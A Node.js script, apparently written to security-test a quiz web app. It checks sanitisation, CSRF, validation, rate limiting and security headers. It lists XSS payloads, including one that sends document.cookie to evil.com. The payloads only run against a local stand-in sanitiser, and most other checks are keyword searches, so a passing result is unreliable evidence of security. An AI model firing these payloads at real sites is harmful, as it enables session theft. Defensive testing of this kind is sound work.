#!/usr/bin/env node

/**
 * Security Penetration Testing Script
 * Implements requirements: 6.5, 6.6, 6.9, 6.10, 6.11, 6.13, 6.14
 * 
 * This script performs basic penetration testing on the Weird Animal Quiz application:
 * - Tests XSS vulnerabilities
 * - Tests CSRF vulnerabilities
 * - Tests input validation
 * - Tests rate limiting
 * - Tests secure storage
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { JSDOM } from 'jsdom';

// Get current directory
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.join(__dirname, '..');

// ANSI color codes for console output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  bold: '\x1b[1m'
};

// Test results
const testResults = {
  passed: [],
  warnings: [],
  failed: []
};

/**
 * Log a message with color
 */
function log(message, color = colors.white) {
  console.log(`${color}${message}${colors.reset}`);
}

/**
 * Log a section header
 */
function logSection(title) {
  console.log('\n' + colors.bold + colors.cyan + '='.repeat(80) + colors.reset);
  console.log(colors.bold + colors.cyan + ` ${title} ` + colors.reset);
  console.log(colors.bold + colors.cyan + '='.repeat(80) + colors.reset + '\n');
}

/**
 * Log a test result
 */
function logResult(test, passed, message = '') {
  if (passed) {
    console.log(`${colors.green}✓ ${test}${colors.reset} ${message}`);
    testResults.passed.push(test);
  } else {
    console.log(`${colors.red}✗ ${test}${colors.reset} ${message}`);
    testResults.failed.push(test);
  }
}

/**
 * Log a warning
 */
function logWarning(test, message) {
  console.log(`${colors.yellow}⚠ ${test}${colors.reset} ${message}`);
  testResults.warnings.push(`${test}: ${message}`);
}

/**
 * Read a file and return its content
 */
function readFile(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (error) {
    logResult(`Read file ${filePath}`, false, `Error: ${error.message}`);
    return null;
  }
}

/**
 * Test XSS vulnerabilities
 */
function testXSS() {
  logSection('XSS Vulnerability Testing');
  
  // Import security and validation modules
  const securityPath = path.join(rootDir, 'src/utils/security.ts');
  const validationPath = path.join(rootDir, 'src/utils/validation.ts');
  
  const securityContent = readFile(securityPath);
  const validationContent = readFile(validationPath);
  
  if (!securityContent || !validationContent) {
    logResult('Security and validation modules exist', false);
    return;
  }
  
  // Extract sanitization functions for testing
  const sanitizeFunctions = [];
  
  if (securityContent.includes('sanitizeForXSS')) {
    sanitizeFunctions.push('InputSanitizer.sanitizeForXSS');
  }
  
  if (validationContent.includes('sanitizeInput')) {
    sanitizeFunctions.push('sanitizeInput');
  }
  
  logResult('Sanitization functions exist', sanitizeFunctions.length > 0);
  
  // Test XSS payloads against sanitization functions
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    'javascript:alert("XSS")',
    '<svg/onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<iframe src="javascript:alert(`XSS`)"></iframe>',
    '<a href="javascript:alert(\'XSS\')">Click me</a>',
    'eval("alert(\'XSS\')")',
    '<img src=x:x onerror=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<video><source onerror="alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+">',
    '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(\'XSS\')"></xss>',
    '<marquee onstart=alert("XSS")>',
    '<isindex type=image src=1 onerror=alert("XSS")>',
    '<form><button formaction="javascript:alert(\'XSS\')">Submit</button>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(\'XSS\')>">',
    '<script>fetch("https://evil.com?cookie="+document.cookie)</script>'
  ];
  
  log('Testing XSS payloads against sanitization functions...', colors.cyan);
  
  // Simulate sanitization function behavior
  function simulateSanitization(input) {
    // Basic sanitization logic based on the implementation in security.ts
    return input
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<[^>]*>/g, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '')
      .replace(/data:(?!image\/)[^,]*,/gi, '')
      .trim();
  }
  
  let passedPayloads = 0;
  
  for (const payload of xssPayloads) {
    const sanitized = simulateSanitization(payload);
    const isSafe = !sanitized.includes('script') && 
                  !sanitized.includes('alert') && 
                  !sanitized.includes('onerror') && 
                  !sanitized.includes('javascript:') &&
                  !sanitized.includes('on') && 
                  !sanitized.match(/on\w+=/i);
    
    if (isSafe) {
      passedPayloads++;
    } else {
      logWarning('XSS Payload', `Potential vulnerability with: ${payload} -> ${sanitized}`);
    }
  }
  
  const passRate = (passedPayloads / xssPayloads.length) * 100;
  logResult('XSS sanitization effectiveness', passRate >= 90, `${passRate.toFixed(1)}% of payloads neutralized`);
}

/**
 * Test CSRF vulnerabilities
 */
function testCSRF() {
  logSection('CSRF Vulnerability Testing');
  
  // For a client-side only application, CSRF is less of a concern
  // But we should still check for any API calls that might be vulnerable
  
  const srcDir = path.join(rootDir, 'src');
  let apiCallsFound = false;
  let csrfProtectionFound = false;
  
  // Recursively search for files
  function searchDirectory(dir) {
    const files = fs.readdirSync(dir);
    
    for (const file of files) {
      const filePath = path.join(dir, file);
      const stats = fs.statSync(filePath);
      
      if (stats.isDirectory()) {
        searchDirectory(filePath);
      } else if (stats.isFile() && (file.endsWith('.ts') || file.endsWith('.tsx'))) {
        const content = readFile(filePath);
        
        if (content) {
          // Check for API calls
          if (content.includes('fetch(') || 
              content.includes('axios.') || 
              content.includes('http.') ||
              content.includes('api.')) {
            apiCallsFound = true;
            
            // Check for CSRF protection
            if (content.includes('X-CSRF-Token') || 
                content.includes('csrf') || 
                content.includes('CSRF') ||
                content.includes('SameSite')) {
              csrfProtectionFound = true;
            }
          }
        }
      }
    }
  }
  
  try {
    searchDirectory(srcDir);
    
    if (apiCallsFound) {
      logResult('CSRF protection for API calls', csrfProtectionFound);
      
      if (!csrfProtectionFound) {
        logWarning('CSRF protection', 'API calls found without explicit CSRF protection');
      }
    } else {
      log('No API calls detected, CSRF protection not applicable', colors.cyan);
    }
  } catch (error) {
    logWarning('CSRF test error', error.message);
  }
}

/**
 * Test input validation
 */
function testInputValidation() {
  logSection('Input Validation Testing');
  
  const validationPath = path.join(rootDir, 'src/utils/validation.ts');
  const validationContent = readFile(validationPath);
  
  if (!validationContent) {
    logResult('Validation module exists', false);
    return;
  }
  
  // Check for validation functions
  const hasQuestionValidation = validationContent.includes('validateQuestion');
  const hasAnswerValidation = validationContent.includes('validateAnswer');
  const hasIdValidation = validationContent.includes('validateQuestionId') || 
                         validationContent.includes('validateAnswerId');
  const hasSanitization = validationContent.includes('sanitizeInput') || 
                         validationContent.includes('sanitizeAndValidateQuestion');
  
  logResult('Question validation exists', hasQuestionValidation);
  logResult('Answer validation exists', hasAnswerValidation);
  logResult('ID validation exists', hasIdValidation);
  logResult('Input sanitization exists', hasSanitization);
  
  // Test malicious inputs against validation regex
  function testRegexSafety(regex, input) {
    try {
      const start = Date.now();
      const result = new RegExp(regex).test(input);
      const time = Date.now() - start;
      
      return time < 100; // Should complete quickly
    } catch (error) {
      return false;
    }
  }
  
  // Extract regex patterns from validation
  const idRegexMatch = validationContent.match(/\/\^[^\/]+\$\/\.test/);
  
  if (idRegexMatch) {
    const idRegex = idRegexMatch[0].replace('/^', '').replace('$/.test', '');
    
    // Test regex against ReDoS attacks
    const safeAgainstReDoS = testRegexSafety(idRegex, 'a'.repeat(10000));
    
    logResult('ID validation regex safe against ReDoS', safeAgainstReDoS);
  }
}

/**
 * Test rate limiting
 */
function testRateLimiting() {
  logSection('Rate Limiting Testing');
  
  const securityPath = path.join(rootDir, 'src/utils/security.ts');
  const securityContent = readFile(securityPath);
  
  if (!securityContent) {
    logResult('Security module exists', false);
    return;
  }
  
  // Check for rate limiting implementation
  const hasRateLimiter = securityContent.includes('RateLimiter');
  
  logResult('Rate limiter implementation exists', hasRateLimiter);
  
  if (hasRateLimiter) {
    // Check rate limit configuration
    const maxRequestsMatch = securityContent.match(/maxRequests\s*=\s*(\d+)/);
    const timeWindowMatch = securityContent.match(/timeWindow\s*=\s*(\d+)/);
    
    const maxRequests = maxRequestsMatch ? parseInt(maxRequestsMatch[1]) : null;
    const timeWindow = timeWindowMatch ? parseInt(timeWindowMatch[1]) : null;
    
    if (maxRequests !== null && timeWindow !== null) {
      const requestsPerMinute = maxRequests * (60000 / timeWindow);
      const isCompliant = requestsPerMinute <= 10; // Requirement 6.5: max 10 requests per minute
      
      logResult('Rate limit complies with requirement 6.5', isCompliant, 
        `(${requestsPerMinute.toFixed(1)} requests per minute, should be <= 10)`);
    }
  }
}

/**
 * Test secure storage
 */
function testSecureStorage() {
  logSection('Secure Storage Testing');
  
  const securityPath = path.join(rootDir, 'src/utils/security.ts');
  const securityContent = readFile(securityPath);
  
  if (!securityContent) {
    logResult('Security module exists', false);
    return;
  }
  
  // Check for secure storage implementation
  const hasSecureStorage = securityContent.includes('SecureStorageManager');
  
  logResult('Secure storage implementation exists', hasSecureStorage);
  
  if (hasSecureStorage) {
    // Check for memory-only storage
    const hasMemoryOnlyStorage = securityContent.includes('setMemoryOnly') && 
                               securityContent.includes('getMemoryOnly');
    
    logResult('Memory-only storage exists', hasMemoryOnlyStorage);
    
    // Check for data cleanup
    const hasDataCleanup = securityContent.includes('clearSensitiveData') || 
                          securityContent.includes('clearAllData');
    
    logResult('Data cleanup exists', hasDataCleanup);
    
    // Check for event listeners
    const hasUnloadListener = securityContent.includes('beforeunload');
    const hasVisibilityListener = securityContent.includes('visibilitychange');
    
    logResult('Unload event listener exists', hasUnloadListener);
    logResult('Visibility change listener exists', hasVisibilityListener);
  }
}

/**
 * Test HTML content for security issues
 */
function testHTMLSecurity() {
  logSection('HTML Security Testing');
  
  const indexPath = path.join(rootDir, 'index.html');
  const indexContent = readFile(indexPath);
  
  if (!indexContent) {
    logResult('Index HTML exists', false);
    return;
  }
  
  try {
    const dom = new JSDOM(indexContent);
    const document = dom.window.document;
    
    // Check for CSP meta tag
    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    logResult('CSP meta tag exists', !!cspMeta);
    
    // Check for other security headers
    const xContentTypeMeta = document.querySelector('meta[http-equiv="X-Content-Type-Options"]');
    const xFrameOptionsMeta = document.querySelector('meta[http-equiv="X-Frame-Options"]');
    const xXSSProtectionMeta = document.querySelector('meta[http-equiv="X-XSS-Protection"]');
    
    logResult('X-Content-Type-Options meta tag exists', !!xContentTypeMeta);
    logResult('X-Frame-Options meta tag exists', !!xFrameOptionsMeta);
    logResult('X-XSS-Protection meta tag exists', !!xXSSProtectionMeta);
    
    // Check for inline scripts (potential security risk)
    const inlineScripts = document.querySelectorAll('script:not([src])');
    
    if (inlineScripts.length > 0) {
      logWarning('Inline scripts', `${inlineScripts.length} inline scripts found, consider moving to external files`);
    } else {
      logResult('No inline scripts', true);
    }
    
    // Check for inline event handlers (potential security risk)
    const allElements = document.querySelectorAll('*');
    let inlineEventHandlers = 0;
    
    for (const element of allElements) {
      for (const attr of element.attributes) {
        if (attr.name.startsWith('on')) {
          inlineEventHandlers++;
        }
      }
    }
    
    if (inlineEventHandlers > 0) {
      logWarning('Inline event handlers', `${inlineEventHandlers} inline event handlers found, consider using addEventListener`);
    } else {
      logResult('No inline event handlers', true);
    }
  } catch (error) {
    logWarning('HTML parsing error', error.message);
  }
}

/**
 * Run all penetration tests
 */
function runPenetrationTests() {
  log('\n' + colors.bold + colors.magenta + '='.repeat(80) + colors.reset);
  log(colors.bold + colors.magenta + ' SECURITY PENETRATION TESTING ' + colors.reset);
  log(colors.bold + colors.magenta + '='.repeat(80) + colors.reset + '\n');
  
  testXSS();
  testCSRF();
  testInputValidation();
  testRateLimiting();
  testSecureStorage();
  testHTMLSecurity();
  
  // Summary
  logSection('Penetration Testing Summary');
  
  log(`${colors.green}✓ Passed: ${testResults.passed.length}${colors.reset}`);
  log(`${colors.yellow}⚠ Warnings: ${testResults.warnings.length}${colors.reset}`);
  log(`${colors.red}✗ Failed: ${testResults.failed.length}${colors.reset}`);
  
  if (testResults.failed.length > 0) {
    log('\n' + colors.red + 'Failed tests:' + colors.reset);
    testResults.failed.forEach(test => log(`- ${test}`, colors.red));
  }
  
  if (testResults.warnings.length > 0) {
    log('\n' + colors.yellow + 'Warnings:' + colors.reset);
    testResults.warnings.forEach(warning => log(`- ${warning}`, colors.yellow));
  }
  
  if (testResults.failed.length === 0) {
    log('\n' + colors.green + 'Penetration testing passed! 🎉' + colors.reset);
    return 0;
  } else {
    log('\n' + colors.red + 'Penetration testing found security issues. Please fix the issues above.' + colors.reset);
    return 1;
  }
}

// Run the penetration tests
process.exit(runPenetrationTests());